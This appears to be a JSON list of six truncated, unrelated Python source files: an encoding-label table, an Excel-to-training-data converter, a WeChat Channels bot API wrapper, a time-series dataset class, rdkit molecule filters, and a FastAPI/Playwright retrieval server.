    "\"\"\"\n\n    webencodings.labels\n    ~~~~~~~~~~~~~~~~~~~\n\n    Map encoding labels to their name.\n\n    :copyright: Copyright 2012 by Simon Sapin\n    :license: BSD, see LICENSE for details.\n\n\"\"\"\n\n# XXX Do not edit!\n# This file is automatically generated by mklabels.py\n\nLABELS = {\n    'unicode-1-1-utf-8':   'utf-8',\n    'utf-8':               'utf-8',\n    'utf8':                'utf-8',\n    '866':                 'ibm866',\n    'cp866':               'ibm866',\n    'csibm866':            'ibm866',\n    'ibm866':              'ibm866',\n    'csisolatin2':         'iso-8859-2',\n    'iso-8859-2':          'iso-8859-2',\n    'iso-ir-101':          'iso-8859-2',\n    'iso8859-2':           'iso-8859-2',\n    'iso88592':            'iso-8859-2',\n    'iso_8859-2':          'iso-8859-2',\n    'iso_8859-2:1987':     'iso-8859-2',\n    'l2':                  'iso-8859-2',\n    'latin2':              'iso-8859-2',\n    'csisolatin3':         'iso-8859-3',\n    'iso-8859-3':          'iso-8859-3',\n    'iso-ir-109':          'iso-8859-3',\n    'iso8859-3':           'iso-8859-3',\n    'iso88593':            'iso-8859-3',\n    'iso_8859-3':          'iso-8859-3',\n    'iso_8859-3:1988':     'iso-8859-3',\n    'l3':                  'iso-8859-3',\n    'latin3':              'iso-8859-3',\n    'csisolatin4':         'iso-8859-4',\n    'iso-8859-4':          'iso-8859-4',\n    'iso-ir-110':          'iso-8859-4',\n    'iso8859-4':           'iso-8859-4',\n    'iso88594':            'iso-8859-4',\n    'iso_8859-4':          'iso-8859-4',\n    'iso_8859-4:1988':     'iso-8859-4',\n    'l4':                  'iso-8859-4',\n    'latin4':              'iso-8859-4',\n    'csisolatincyrillic':  'iso-8859-5',\n    'cyrillic':            'iso-8859-5',\n    'iso-8859-5':          'iso-8859-5',\n    'iso-ir-144':          'iso-8859-5',\n    'iso8859-5':           'iso-8859-5',\n    'iso88595':            'iso-8859-5',\n    'iso_8859-5':          'iso-8859-5',\n    'iso_8859-5:1988':     'iso-8859-5',\n    'arabic':              'iso-8859-6',\n    'asmo-708':            'iso-8859-6',\n    'csiso88596e':         'iso-8859-6',\n    'csiso88596i':         'iso-8859-6',\n    'csisolatinarabic':    'iso-8859-6',\n    'ecma-114':            'iso-8859-6',\n    'iso-8859-6':          'iso-8859-6',\n    'iso-8859-6-e':        'iso-8859-6',\n    'iso-8859-6-i':        'iso-8859-6',\n    'iso-ir-127':          'iso-8859-6',\n    'iso8859-6':           'iso-8859-6',\n    'iso88596':            'iso-8859-6',\n    'iso_8859-6':          'iso-8859-6',\n    'iso_8859-6:1987':     'iso-8859-6',\n    'csisolatingreek':     'iso-8859-7',\n    'ecma-118':            'iso-8859-7',\n    'elot_928':            'iso-8859-7',\n    'greek':               'iso-8859-7',\n    'greek8':              'iso-8859-7',\n    'iso-8859-7':          'iso-8859-7',\n    'iso-ir-126':          'iso-8859-7',\n    'iso8859-7':           'iso-8859-7',\n    'iso88597':            'iso-8859-7',\n    'iso_8859-7':          'iso-8859-7',\n    'iso_8859-7:1987':     'iso-8859-7',\n    'sun_eu_greek':        'iso-8859-7',\n    'csiso88598e':         'iso-8859-8',\n    'csisolatinhebrew':    'iso-8859-8',\n    'hebrew':              'iso-8859-8',\n    'iso-8859-8':          'iso-8859-8',\n    'iso-8859-8-e':        'iso-8859-8',\n    'iso-ir-138':          'iso-8859-8',\n    'iso8859-8':           'iso-8859-8',\n    'iso88598':            'iso-8859-8',\n    'iso_8859-8':          'iso-8859-8',\n    'iso_8859-8:1988':     'iso-8859-8',\n    'visual':              'iso-8859-8',\n    'csiso88598i':         'iso-8859-8-i',\n    'iso-8859-8-i':        'iso-8859-8-i',\n    'logical':             'iso-8859-8-i',\n    'csisolatin6':         'iso-8859-10',\n    'iso-8859-10':         'iso-8859-10',\n    'iso-ir-157':          'iso-8859-10',\n    'iso8859-10':          'iso-8859-10',\n    'iso885910':           'iso-8859-10',\n    'l6':                  'iso-8859-10',\n    'latin6':              'iso-8859-10',\n    'iso-8859-13':         'iso-8859-13',\n    'iso8859-13':          'iso-8859-13',\n    'iso885913':           'iso-8859-13',\n    'iso-8859-14':         'iso-8859-14',\n    'iso8859-14':          'iso-8859-14',\n    'iso885914':           'iso-8859-14',\n    'csisolatin9':         'iso-8859-15',\n    'iso-8859-15':         'iso-8859-15',\n    'iso8859-15':          'iso-8859-15',\n    'iso885915':           'iso-8859-15',\n    'iso_8859-15':         'iso-8859-15',\n    'l9':                  'iso-8859-15',\n    'iso-8859-16':         'iso-8859-16',\n    'cskoi8r':             'koi8-r',\n    'koi':                 'koi8-r',\n    'koi8':                'koi8-r',\n    'koi8-r':              'koi8-r',\n    'koi8_r':              'koi8-r',\n    'koi8-u':              'koi8-u',\n    'csmacintosh':         'macintosh',\n    'mac':                 'macintosh',\n    'macintosh':           'macintosh',\n    'x-mac-roman':         'macintosh',\n    'dos-874':             'windows-874',\n    'iso-8859-11':         'windows-874',\n    'iso8859-11':          'windows-874',\n    'iso885911':           'windows-874'",
    "\r\nimport pandas as pd\r\nimport json\r\nimport os\r\n\r\ndef process_multiple_excels(input_folder, output_json_file):\r\n    # \u5b58\u50a8\u6240\u6709\u6570\u636e\u7684\u5217\u8868\r\n    all_data = []\r\n\r\n    # \u904d\u5386\u6307\u5b9a\u6587\u4ef6\u5939\u4e0b\u7684\u6240\u6709Excel\u6587\u4ef6\r\n    for filename in os.listdir(input_folder):\r\n        if filename.endswith(\".xlsx\"):\r\n            file_path = os.path.join(input_folder, filename)\r\n\r\n            # \u8bfb\u53d6 Excel \u6587\u4ef6\r\n            xls = pd.ExcelFile(file_path)\r\n\r\n            # \u904d\u5386\u6bcf\u4e2a sheet\r\n            for sheet_name in xls.sheet_names:\r\n                # \u8bfb\u53d6\u6bcf\u4e2a sheet \u4e2d\u7684\u6570\u636e\r\n                df = pd.read_excel(xls, sheet_name, header=None)\r\n\r\n                # \u4ece\u7b2c5\u884c\u5f00\u59cb\u8bfb\u53d6\r\n                for index, row in df.iterrows():\r\n                    if index >= 4:\r\n                        # \u8bfb\u53d6\u5355\u5143\u683c\u6570\u636e\r\n                        cell_value1 = row.iloc[1] if pd.notna(row.iloc[1]) else \"\"\r\n                        cell_value2 = row.iloc[2] if pd.notna(row.iloc[2]) else \"\"\r\n                        cell_value3 = row.iloc[3] if pd.notna(row.iloc[3]) else \"\"\r\n                        cell_value4 = row.iloc[4] if pd.notna(row.iloc[4]) else \"\"\r\n                        cell_value5 = row.iloc[5] if pd.notna(row.iloc[5]) else \"\"\r\n\r\n                        # \u7ec4\u6210\u5b57\u7b26\u4e32data\r\n                        content = f\"\u5b89\u5168\u63a7\u5236\u70b9\uff1a{cell_value1}\u3002\u68c0\u6d4b\u9879\uff1a{cell_value2}\u3002\u68c0\u6d4b\u7ed3\u679c\uff1a{cell_value3}\u3002\"\r\n                        summary = f\"\u68c0\u6d4b\u95ee\u9898\uff1a{cell_value4}\u3002\u7b26\u5408\u60c5\u51b5\uff1a{cell_value5}\"\r\n                        data = {\"instruction\": content, \"input\": \"\",\"output\": summary},\r\n                        # print(data)\r\n                        # \u6dfb\u52a0\u5230\u5217\u8868\r\n                        all_data.append(json.dumps(data, ensure_ascii=False))\r\n\r\n    # \u5c06\u5217\u8868\u5199\u5165 JSON \u6587\u4ef6\r\n    with open(output_json_file, 'w', encoding='utf-8') as json_file:\r\n        json_file.write(\"\\n\".join(all_data))\r\n\r\n# \u7528\u6cd5\u793a\u4f8b\r\nexcel_folder_path = 'E:\\\\MyWork\\\\'  # \u66ff\u6362\u6210\u5305\u542bExcel\u6587\u4ef6\u7684\u6587\u4ef6\u5939\u8def\u5f84\r\noutput_json_file_path = 'sft_for_qwen.json'  # \u66ff\u6362\u6210\u4f60\u60f3\u8981\u4fdd\u5b58\u7684 JSON \u6587\u4ef6\u8def\u5f84\r\n\r\nprocess_multiple_excels(excel_folder_path, output_json_file_path)\r\n\r\n",
    "import json\nimport os\n\nimport requests\nfrom tqdm import tqdm\n\nfrom bot.infrastructure.wexin import WechatUtils\n\n\nclass ChannelNativeApi:\n    \"\"\"\n    todo \u89c6\u9891\u53f7\u539f\u751f\u63a5\u53e3\n    \"\"\"\n    pass\n\n\n# \u641c\u7d22\u89c6\u9891\u53f7\ndef search_channel(wechat_id, keyword, lastBuffer=None):\n    \"\"\"\n    todo \u641c\u7d22\u89c6\u9891\u53f7\n    :param wechat_id: \u5fae\u4fe1id\n    :param keyword: \u5173\u952e\u5b57\n    :return:\n    \"\"\"\n    req = {\n        \"type\": 10063,\n        \"keyword\": keyword,\n    }\n    if lastBuffer is not None:\n        req[\"lastBuffer\"] = lastBuffer\n\n    resdata = WechatUtils._post_wx_request(wechat_id, req)\n    return resdata\n\n\n# \u83b7\u53d6\u4f5c\u54c1\u5217\u8868\ndef get_channel_list(wechat_id, channel_user_id, lastBuffer=None):\n    \"\"\"\n    \u83b7\u53d6\u4f5c\u54c1\u5217\u8868\n    :param wechat_id: \u5fae\u4fe1id\n    :param channel_user_id: \u89c6\u9891\u53f7\u4f5c\u8005id\n    :param lastBuffer: \u6307\u5b9a\u7ed3\u679c\u7684\u8d77\u59cb\u70b9\uff0c\u4ece\u8fd4\u56de\u7684\u5185\u5bb9\u4e2d\u83b7\u53d6\n    :return:\n    \"\"\"\n    req = {\n        \"type\": 10038,\n        \"userName\": channel_user_id,\n    }\n    if lastBuffer is not None:\n        req[\"lastBuffer\"] = lastBuffer\n\n    resdata = WechatUtils._post_wx_request(wechat_id, req)\n    return resdata['data']\n\n\n# \u89c6\u9891\u53f7\u4f5c\u54c1\u89e3\u5bc6\ndef decrypt_channel_video(wechat_id, inputFile, outputFile, decodeKey, encLength):\n    \"\"\"\n    \u89c6\u9891\u53f7\u4f5c\u54c1\u89e3\u5bc6\n    :param wechat_id: \u5fae\u4fe1id\n    :param inputFile: \u5df2\u4e0b\u8f7d\u7684\u52a0\u5bc6\u89c6\u9891\u7edd\u5bf9\u8def\u5f84\n    :param outputFile: \u4fdd\u5b58\u89e3\u5bc6\u89c6\u9891\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u9700\u8981\u5305\u542b\u6587\u4ef6\u540d\n    :param decodeKey: \u83b7\u53d6\u4f5c\u54c1\u5217\u8868\u63a5\u53e3\u4f1a\u8fd4\u56de\u8be5\u5b57\u6bb5\n    :param encLength: \u89c6\u9891\u88ab\u52a0\u5bc6\u7684\u957f\u5ea6\uff0c\u4e0b\u8f7d\u89c6\u9891\u65f6\u7684header\u5305\u542b\u8be5\u5b57\u6bb5\n    :return:\n    \"\"\"\n    req = {\n        \"type\": 10060,\n        \"inputFile\": inputFile,\n        \"outputFile\": outputFile,\n        \"decodeKey\": int(decodeKey),\n        \"encLength\": int(encLength),\n    }\n\n    resdata = WechatUtils._post_wx_request(wechat_id, req)\n    # \u5220\u9664inputFile\n    os.remove(inputFile)\n    return resdata\n\n\n# \u83b7\u53d6\u63a8\u8350\u5185\u5bb9\ndef get_recommend_channel(wechat_id, lastBuffer=None):\n    \"\"\"\n    :param wechat_id: \u5fae\u4fe1id\n    :param lastBuffer: \u6307\u5b9a\u7ed3\u679c\u7684\u8d77\u59cb\u70b9\uff0c\u4ece\u8fd4\u56de\u7684\u5185\u5bb9\u4e2d\u83b7\u53d6\n    :return:\n    \"\"\"\n    req = {\n        \"type\": 10064,\n        \"longitude\": \"105.43\",\n        \"latitude\": \"38.51\",\n    }\n    if lastBuffer is not None:\n        req[\"lastBuffer\"] = lastBuffer\n\n    resdata = WechatUtils._post_wx_request(wechat_id, req)\n    return resdata\n\n\n# \u83b7\u53d6\u4f5c\u54c1\u5f39\u5e55\ndef get_channel_bullet(wechat_id, objectId, startTimestamp=None):\n    \"\"\"\n    \u83b7\u53d6\u4f5c\u54c1\u5f39\u5e55\n    :param wechat_id: \u5fae\u4fe1id\n    :param objectId: \u89c6\u9891\u53f7\u4f5c\u8005id\n    :param startTimestamp: \u5f00\u59cb\u83b7\u53d6\u5f39\u5e55\u7684\u8d77\u59cb\u70b9\uff0c\u5355\u4f4d\uff1a\u6beb\u79d2\n    :return:\n    \"\"\"\n    req = {\n        \"type\": 10065,\n        \"objectId\": objectId,\n    }\n    if startTimestamp is not None:\n        req[\"startTimestamp\"] = startTimestamp\n    resdata = WechatUtils._post_wx_request(wechat_id, req)\n    return resdata\n\n\n# \u83b7\u53d6\u4f5c\u54c1\u8bc4\u8bba\u5217\u8868\ndef get_channel_comment_list(wechat_id, objectId, objectNonceId, rootCommentId=None, lastBuffer=None):\n    \"\"\"\n    \u83b7\u53d6\u4f5c\u54c1\u8bc4\u8bba\u5217\u8868\n    :param wechat_id: \u5fae\u4fe1id\n    :param objectId: \u89c6\u9891\u53f7\u4f5c\u8005id\n    :param objectNonceId: \u4f5c\u54c1nonceId\n    :param rootCommentId: \u8bc4\u8bbaid\uff0c\u5982\u679c\u8bbe\u5b9a\u4e86\u6b64\u53c2\u6570\uff0c\u5219\u4f1a\u83b7\u53d6\u8be5\u8bc4\u8bba\u7684\u5b50\u8bc4\u8bba\u5217\u8868\n    :param lastBuffer: \u6307\u5b9a\u7ed3\u679c\u7684\u8d77\u59cb\u70b9\uff0c\u4ece\u8fd4\u56de\u7684\u5185\u5bb9\u4e2d\u83b7\u53d6\n    :return:\n    \"\"\"\n    req = {\n        \"type\": 10066,\n        \"objectId\": objectId,\n        \"objectNonceId\": objectNonceId,\n        \"h5AuthKey\": \"xxxxx\",\n    }\n\n    if lastBuffer is not None:\n        req[\"lastBuffer\"] = lastBuffer\n\n    if rootCommentId is not None:\n        req[\"rootCommentId\"] = rootCommentId\n\n    resdata = WechatUtils._post_wx_request(wechat_id, req)\n    return resdata\n\n\n# \u83b7\u53d6\u4f5c\u54c1\u8bc4\u8bba\u8be6\u60c5\ndef get_channel_comment_detail(wechat_id, channel_user_id, objectId, objectNonceId, lastBuffer=None,\n                               sessionBuffer=None):\n    \"\"\"\n    \u83b7\u53d6\u4f5c\u54c1\u8bc4\u8bba\u8be6\u60c5\n    :param wechat_id: \u5fae\u4fe1id\n    :param objectId: \u89c6\u9891\u53f7\u4f5c\u8005id\n    :param objectNonceId: \u4f5c\u54c1nonceId\n    :param commentId: \u8bc4\u8bbaid\n    :return:\n    \"\"\"\n    req = {\n        \"type\": 10067,\n        \"objectId\": objectId,\n        \"objectNonceId\": objectNonceId,\n        \"userName\": channel_user_id,\n    }\n    if lastBuffer is not None:\n        req[\"lastBuffer\"] = lastBuffer\n    if sessionBuffer is not None:\n        req[\"sessionBuffer\"] = sessionBuffer\n\n    resdata = WechatUtils._post_wx_request(wechat_id, req)\n    return resdata[\"data\"]\n\n\n# \u83b7\u53d6\u6211\u7684\u5173\u6ce8\u5217\u8868\ndef get_my_follow_list(wechat_id, lastBuffer=None):\n    \"\"\"\n    \u83b7\u53d6\u6211\u7684\u5173\u6ce8\u5217\u8868\n    :param wechat_id: \u5fae\u4fe1id\n    :param lastBuffer: \u6307\u5b9a\u7ed3\u679c\u7684\u8d77\u59cb\u70b9\uff0c\u4ece\u8fd4\u56de\u7684\u5185\u5bb9\u4e2d\u83b7\u53d6\n    :return:\n    \"\"\"\n    req = {\n        \"type\": 10068,\n    }\n    if lastBuffer is not None:\n        req[\"lastBuffer\"] = lastBuffer\n\n    resdata = WechatUtils._post_wx_request(wechat_id, req)\n    return resdata\n\n\n# \u83b7\u53d6\u6211\u7684\u70b9\u8d5e\u5217\u8868\ndef get_my_like_list(wechat_id, lastBuffer=None):\n    \"\"\"\n    \u83b7\u53d6\u6211\u7684\u70b9\u8d5e\u5217\u8868\n    :param wechat_id: \u5fae\u4fe1id\n    :param lastBuffer: \u6307\u5b9a\u7ed3\u679c\u7684\u8d77\u59cb\u70b9\uff0c\u4ece\u8fd4\u56de\u7684\u5185\u5bb9\u4e2d\u83b7\u53d6\n    :return:\n    \"\"\"\n    req = {\n        \"type\": 10069,\n    }\n    if lastBuffer is not None:\n        req[\"lastBuffer\"] = lastBuffer\n\n    resdata = WechatUtils._post_wx_request(wechat_id, req)\n    return resdata\n\n\n# \u83b7\u53d6\u6211\u7684\u63a8\u8350\u5217\u8868\ndef get_my_recommend_list(wechat_id, lastBuffer=None):\n    \"\"\"\n    \u83b7\u53d6\u6211\u7684\u63a8\u8350\u5217\u8868\n    :param wechat_id: \u5fae\u4fe1id\n    :param lastBuffer: \u6307\u5b9a\u7ed3\u679c\u7684\u8d77\u59cb\u70b9\uff0c\u4ece\u8fd4\u56de\u7684\u5185\u5bb9\u4e2d\u83b7\u53d6\n    :return:\n    \"\"\"\n    req = {\n        \"type\": 10070,\n    }\n    if lastBuffer is not None:\n        req[\"lastBuffer\"] = lastBuffer\n\n    resdata = WechatUtils._post_wx_request",
    "\"\"\"\nDatasets.\n\nUsage:\n  datasets.py [--root=root] --data=data \n\nOptions:\n  --root=root      Root directory [default: ./data]\n  --data=data      Dataset name\n\"\"\"\n\nimport numpy as np\nimport torch\nimport matplotlib.pyplot as plt\nfrom scipy.integrate import odeint as scipy_odeint\nfrom torch.utils.data import Dataset\nfrom abc import ABC\nimport os\nfrom hashlib import sha1\nimport json\nfrom docopt import docopt\nimport pysindy as ps\nimport project_utils\n\ndef estimate_derivatives_single_(i, y, differentiation_method, t):\n    print(f\"{i},\")\n    y_i = y[i].numpy()\n    return differentiation_method._differentiate(y_i, t)\n\nclass SeriesDataset(ABC, Dataset):\n    \"\"\"\n    Abstract class for Time Series Datasets\n    y, t\n    \"\"\"\n\n    def __init__(self, max_for_scaling=None):\n        # y shape: (n_samples, time_steps, dimension)\n        # t shape: (time_steps)\n\n        self.state_dim = None\n        self.state_names = None\n        self.y = None\n        self.dy = None      # Estimated derivatives\n        self.t = None\n        self.input_length = None\n        self.max_for_scaling = max_for_scaling\n        self.phy_params = None      # Fitted parameters\n\n    def plot(self, dim=0, **kwargs):\n        unscaled_y = self.return_unscaled_y()\n        for i in range(len(self)):\n            plt.plot(\n                self.t.numpy(),\n                unscaled_y[i, :, dim].numpy(),\n                label=f\"y(t): dimension {dim}\",\n            )\n        if self.input_length > 0:\n            plt.axvline(\n                x=self.t.numpy()[self.input_length - 1], linestyle=\"--\", color=\"black\"\n            )\n\n        if \"ylim\" in kwargs:\n            plt.ylim(kwargs[\"ylim\"])\n        if \"xlim\" in kwargs:\n            plt.xlim(kwargs[\"xlim\"])\n        if \"xlabel\" in kwargs:\n            plt.xlabel(kwargs[\"xlabel\"])\n        if \"ylabel\" in kwargs:\n            plt.ylabel(kwargs[\"ylabel\"])\n        if \"title\" in kwargs:\n            plt.title(kwargs[\"title\"])\n        plt.show()\n\n    def scale(self, is_scale=False):\n        if self.max_for_scaling is None:\n            if is_scale:\n                self.max_for_scaling = self.y.amax(dim=[0, 1]) / 10.\n            else:\n                self.max_for_scaling = torch.ones(self.state_dim)\n\n        self.y = self.y / self.max_for_scaling\n\n    def return_unscaled_y(self):\n        return self.y * self.max_for_scaling\n\n\n    def estimate_derivatives(self, method=\"smooth\"):\n        if self.y is None:\n            return\n\n        t = self.t.numpy()\n        if method == \"tvr\":\n            differentiation_method = project_utils.DiffTVR(t, 0.2)\n        elif method == \"smooth\":\n            differentiation_method = ps.SmoothedFiniteDifference(order=2, smoother_kws={'window_length': 5})\n        else:\n            differentiation_method = ps.FiniteDifference(order=2)\n\n        # Sequential\n        dy = []\n        for i in range(self.y.shape[0]):\n            y_i = self.y[i].numpy()\n            dy.append(differentiation_method._differentiate(y_i, t))\n        dy = torch.tensor(np.stack(dy))\n\n        return dy\n    \n    def estimate_all_derivatives(self):\n        self.dy = {}\n        self.dy[\"smooth\"] = self.estimate_derivatives(method=\"smooth\")\n        # self.dy[\"tvr\"] = self.estimate_derivatives(method=\"tvr\")\n    \n    def get_initial_value_array(self, y0, n_samples):\n        initial_value_array = []\n        for i in range(self.state_dim):\n            if isinstance(y0[i], tuple):\n                array = np.random.uniform(*y0[i], n_samples)\n            else:\n                array = np.tile(y0[i], n_samples)\n            initial_value_array.append(array)\n\n        initial_value_array = np.stack(initial_value_array, axis=1)\n        return initial_value_array\n\n    def get_param_arrays(self, params, n_samples):\n        param_arrays = []\n        for param in params:\n            if isinstance(param, tuple):\n                param_array = np.random.uniform(*param, n_samples)\n            else:\n                param_array = np.tile(param, n_samples)\n            param_arrays.append(param_array)\n\n        return param_arrays\n\n    def save(self):\n        with open(self.save_filename, \"wb\") as f:\n            all_var = [\n                self.state_names,\n                self.state_dim,\n                self.input_length,\n                self.t,\n                self.y,\n                self.dy,\n                self.max_for_scaling,\n                self.phy_params,\n            ]\n            torch.save(all_var, f)\n\n    def load(self):\n        print(f\"Using saved file: {self.save_filename}\")\n        (\n            self.state_names,\n            self.state_dim,\n            self.input_length,\n            self.t,\n            self.y,\n            self.dy,\n            self.max_for_scaling,\n            self.phy_params,\n        ) = torch.load(self.save_filename)\n\n    def __len__(self):\n        return self.y.shape[0]\n\n    def __getitem__(self, idx):\n        return idx, self.y[idx]\n\n\n\nclass SubsetStar(SeriesDataset):\n    \"\"\"\n    Subset of a dataset at specified indices.\n    Exten",
    "\"\"\"Contains classes which implement various filter components.\"\"\"\n\nimport collections.abc\nimport dataclasses\nimport typing\n\nimport rdkit\nimport rdkit.Chem\nimport rdkit.Chem.rdqueries\n\nfrom doranet import interfaces, metadata\n\n# class AlwaysTrueFilter(interfaces.ReactionFilter):\n#     def __call__(self, operator, reactants, products):\n#         return True\n\n\n# class ChainFilter(interfaces.ReactionFilter):\n#     def __init__(\n#         self, filters: collections.abc.Iterable[interfaces.ReactionFilter]\n#     ):\n#         self._filters = filters\n\n#     def __call__(self, operator, reactants, products):\n#         return all(\n#             (\n#                 filter(operator, reactants, products)\n#                 for filter in self._filters\n#             )  # yo\n#         )\n\n\n# class LessThanNElementTypeFilter(interfaces.ReactionFilter):\n#     def __init__(self, n: int, proton_number: int):\n#         self._n = n\n#         self._p = proton_number\n#         self._q = rdkit.Chem.rdqueries.AtomNumEqualsQueryAtom(proton_number)\n\n#     def __call__(self, operator, reactants, products):\n#         for mol in products:\n#             if (\n#                 isinstance(mol, interfaces.MolDatRDKit)\n#                 and len(mol.rdkitmol.GetAtomsMatchingQuery(self._q)) >=\n#                     self._n\n#             ):\n#                 return False\n#         return True\n\n#     def __getstate__(self):\n#         return (self._n, self._p)\n\n#     def __setstate__(self, arg) -> None:\n#         self._n = arg[0]\n#         self._p = arg[1]\n#         self._q = rdkit.Chem.rdqueries.AtomNumEqualsQueryAtom(self._p)\n\n\n# class TanimotoSimilarityFilter(interfaces.ReactionFilter):\n#     def __init__(self, n: float, smi: str):\n#         self._n = n\n#         self._s = smi\n#         self._tmol = rdkit.Chem.MolFromSmiles(self._s)\n#         self._tfp = rdkit.Chem.RDKFingerprint(self._tmol)\n\n#     def __call__(self, operator, reactants, products):\n#         for mol in products:\n#             if isinstance(mol, interfaces.MolDatRDKit):\n#                 mol_fp = rdkit.Chem.RDKFingerprint(mol.rdkitmol)\n#                 similarity = rdkit.DataStructs.TanimotoSimilarity(\n#                     mol_fp, self._tfp\n#                 )\n\n#                 if similarity > self._n:\n#                     return True\n#         return False\n\n\n# class AlwaysTrueUIDPreFilter(interfaces.UIDPreFilter):\n#     def __call__(\n#         self,\n#         operator: interfaces.Identifier,\n#         reactants: collections.abc.Sequence[interfaces.Identifier],\n#     ) -> bool:\n#         return True\n\n\n# @dataclasses.dataclass(frozen=True)\n# class CoreactantUIDPreFilter(interfaces.UIDPreFilter):\n#     coreactants: collections.abc.Container[interfaces.Identifier]\n\n#     def __call__(\n#         self,\n#         operator: interfaces.Identifier,\n#         reactants: collections.abc.Sequence[interfaces.Identifier],\n#     ) -> bool:\n#         return any(uid not in self.coreactants for uid in reactants)\n\n\n@typing.final\n@dataclasses.dataclass(frozen=True)\nclass MolFilterMetaVal(interfaces.MolFilter):\n    __slots__ = (\"key\", \"val\")\n    key: collections.abc.Hashable\n    val: typing.Any\n\n    def __call__(\n        self,\n        mol: interfaces.DataPacket[interfaces.MolDatBase],\n        op: typing.Optional[interfaces.DataPacket[interfaces.OpDatBase]],\n        arg_num: typing.Optional[int],\n    ) -> bool:\n        if mol.meta is None:\n            return False\n        if self.key not in mol.meta:\n            return False\n        return mol.meta[self.key] == self.val\n\n    @property\n    def meta_required(self) -> interfaces.MetaKeyPacket:\n        return interfaces.MetaKeyPacket(frozenset(), frozenset((self.key,)))\n\n\n@typing.final\n@dataclasses.dataclass(frozen=True)\nclass MolFilterMetaExist(interfaces.MolFilter):\n    __slots__ = (\"key\",)\n    key: collections.abc.Hashable\n\n    def __call__(\n        self,\n        mol: interfaces.DataPacket[interfaces.MolDatBase],\n        op: typing.Optional[interfaces.DataPacket[interfaces.OpDatBase]],\n        arg_num: typing.Optional[int],\n    ) -> bool:\n        if mol.meta is None or self.key not in mol.meta:\n            return False\n        return True\n\n    @property\n    def meta_required(self) -> interfaces.MetaKeyPacket:\n        return interfaces.MetaKeyPacket(frozenset(), frozenset((self.key,)))\n\n\n@typing.final\n@dataclasses.dataclass(frozen=True, slots=True)\nclass MolFilterMetaFunc(interfaces.MolFilter):\n    key: collections.abc.Hashable\n    pred: collections.abc.Callable[[typing.Any], bool]\n    unknown_pass: bool = False\n\n    def __call__(\n        self,\n        mol: interfaces.DataPacket[interfaces.MolDatBase],\n        op: typing.Optional[interfaces.DataPacket[interfaces.OpDatBase]],\n        arg_num: typing.Optional[int],\n    ) -> bool:\n        meta = mol.meta\n        key = self.key\n        if meta is None or key not in meta:\n            return self.unknown_pass\n        return self.pred(meta[key])\n\n    @property\n    def meta_required(self) -> interfaces.MetaKe",
    "import os\n\nIMPORT_LOCAL = os.environ.get('IMPORT_LOCAL', 'false') == 'true'\nMAX_SIZE = int(os.environ.get('MAX_SIZE', '3'))\nMAX_LEN = int(os.environ.get('MAX_LEN', '512'))\nTOP_K_BM25 = int(os.environ.get('TOP_K_BM25', '10'))\nMODEL = os.environ.get('MODEL', 'NousResearch/Nous-Hermes-2-Mixtral-8x7B-DPO')\nENABLE_EMBEDDING = os.environ.get('ENABLE_EMBEDDING', 'false') == 'true'\nMODEL_EMBEDDING = os.environ.get('MODEL_EMBEDDING', 'thenlper/gte-small')\nTOP_K_EMBEDDING = int(os.environ.get('TOP_K', '5'))\n\nfrom fastapi.responses import HTMLResponse, StreamingResponse\nfrom fastapi import BackgroundTasks, FastAPI, WebSocket, WebSocketDisconnect\nfrom pydantic import BaseModel\nfrom playwright.async_api import async_playwright\nfrom collections import defaultdict\nfrom PIL import Image\nfrom huggingface_hub import InferenceClient\nfrom transformers import AutoTokenizer, AutoModel\nfrom tree_sitter_languages import get_language, get_parser\nfrom tree_sitter import Node\nfrom rank_bm25 import BM25Okapi\nimport torch.nn.functional as F\nimport torch\nimport numpy as np\nimport re\nimport io\nimport json\nimport playwright\nimport asyncio\nimport threading\nimport concurrent.futures\n\n\nclient = InferenceClient(model=f'https://api-inference.huggingface.co/models/{MODEL}')\ntokenizer = AutoTokenizer.from_pretrained(MODEL)\nspecial_tokens = set(tokenizer.all_special_tokens)\n\nlanguage = get_language('html')\nparser = get_parser('html')\n\n\ndef chunk_node(node: Node, text: str, max_chars: int = 1500):\n    chunks = []\n    current_chunk = \"\"\n    for child in node.children:\n        if child.end_byte - child.start_byte > max_chars:\n            chunks.append(current_chunk)\n            current_chunk = \"\"\n            chunks.extend(chunk_node(child, text, max_chars))\n        elif child.end_byte - child.start_byte + len(current_chunk) > max_chars:\n            chunks.append(current_chunk)\n            current_chunk = text[child.start_byte: child.end_byte]\n        else:\n            current_chunk += text[child.start_byte: child.end_byte]\n    chunks.append(current_chunk)\n\n    return chunks\n\n\ndef chunking(text, max_len=1500, min_len=20):\n    tree = parser.parse(bytes(text, 'utf-8'))\n    node = tree.root_node\n\n    chunks = []\n    current_chunk = ''\n    for child in node.children:\n        if child.end_byte - child.start_byte > max_len:\n            chunks.append(current_chunk)\n            current_chunk = ''\n            chunks.extend(chunk_node(child, text, max_len))\n        elif child.end_byte - child.start_byte + len(current_chunk) > max_len:\n            chunks.append(current_chunk)\n            current_chunk = text[child.start_byte: child.end_byte]\n        else:\n            current_chunk += text[child.start_byte: child.end_byte]\n\n    chunks.append(current_chunk)\n    chunks = [c.strip() for c in chunks]\n    chunks = [c for c in chunks if len(c) >= min_len]\n    return chunks\n\n\ndef average_pool(last_hidden_states, attention_mask):\n    last_hidden = last_hidden_states.masked_fill(~attention_mask[..., None].bool(), 0.0)\n    return last_hidden.sum(dim=1) / attention_mask.sum(dim=1)[..., None]\n\n\nclass Embedding:\n    model = None\n    tokenizer = None\n\n    def initialize(self):\n        if self.model is None:\n            self.model = AutoModel.from_pretrained(MODEL_EMBEDDING)\n            self.tokenizer = AutoTokenizer.from_pretrained(MODEL_EMBEDDING)\n\n    def encode(self, strings):\n        self.initialize()\n        batch_dict = self.tokenizer(\n            strings,\n            max_length=512,\n            padding=True,\n            truncation=True,\n            return_tensors='pt'\n        )\n        outputs = self.model(**batch_dict)\n        embeddings = average_pool(outputs.last_hidden_state, batch_dict['attention_mask'])\n        embeddings = F.normalize(embeddings, p=2, dim=1)\n        scores = (embeddings[:1] @ embeddings[1:].T)\n        return scores[0].tolist()\n\n\nclass ConnectionManager:\n    def __init__(self, max_size=10):\n        self.active_connections: list[WebSocket] = []\n        self.browser = {}\n        self.page = {}\n        self.done = {}\n        self.executing = {}\n        self.queue = {}\n        self.status = defaultdict(list)\n        self.max_size = max_size\n        self.playwright = None\n\n    async def initialize_playwright(self):\n        if self.playwright is None:\n            self.playwright = await async_playwright().start()\n\n    async def connect(self, websocket: WebSocket, client_id):\n        await websocket.accept()\n        self.active_connections.append(websocket)\n        self.queue[client_id] = len(self.queue)\n\n    async def disconnect(self, websocket: WebSocket, client_id):\n        await websocket.close()\n        